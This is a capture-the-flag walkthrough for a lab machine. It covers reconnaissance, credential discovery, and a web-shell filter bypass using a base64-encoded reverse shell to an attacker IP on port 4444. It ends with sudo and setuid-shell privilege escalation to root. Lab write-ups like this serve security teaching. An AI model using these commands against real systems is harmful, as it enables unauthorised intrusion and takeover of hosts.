# H4ck3rz — Walkthrough

## Intel

Scan the target with nmap:

`
nmap -sC -sV <ip>
`

**Output:**

`PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.0p2 Debian 7+deb13u4 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.68 ((Debian))
|_http-title: my 42sh
|_http-server-header: Apache/2.4.68 (Debian)
| http-robots.txt: 1 disallowed entry
|_/1337_53CR37_l41r
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel`

## Explore

Spot the disallowed entry in the scan output, then browse to it:

`
http://{ip}/1337_53CR37_l41r/
`

This reveals the password

## Find username

Curl the site root:

`
curl http://{ip}
`

Look through the response for the **username**.

## 4. Directory Enumeration

Use Gobuster to discover hidden directories:

`
gobuster fuzz -u http://<ip>/FUZZ -w <wordlist>
`

Locate the login page and authenticate using the credentials found above.

## Inject

The site hosts a shell that filters certain commands. Bypass the filter by base64-encoding the reverse shell payload, then decoding and piping it to `bash`:

`
echo 'c2ggLWkgPiYgL2Rldi90Y3AvMTAuOC4wLjIwMi80NDQ0IDA+JjE=' | base64 -d | bash
`

**Steps:**
1. Paste the command into the browser's shell interface.
2. Start a listener on your machine:

`
nc -lvnp 4444
`

## Exploit

Now that we are in let's check who we are and what we can do

```
whoami
sudo -l
```

**Output:**

```bash
www-data
Matching Defaults entries for www-data on h4xx0r_pc:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User www-data may run the following commands on h4xx0r_pc:
    (titouan) NOPASSWD: ALL
```

Since titouan does not require any password , let's use their shell

```bash
sudo -u titouan /bin/bash
```

Let's check their home dir

```bash
ls /home/titouan
```

**Output:**

```bash
42sh
user.txt
```

From `Titouan`'s website, we know 42sh is a custom shell, it probably has some kind of prevention to remove root privileges upon launch (as `setuid` or `setgid`) like traditional bash

Thankfully, bash has a command to keep privileges when opening a shell, let's try it out

```bash
./42sh -p
```

Thanks to their inspiration from bash, we are now in root, now we can grab the file we were searching for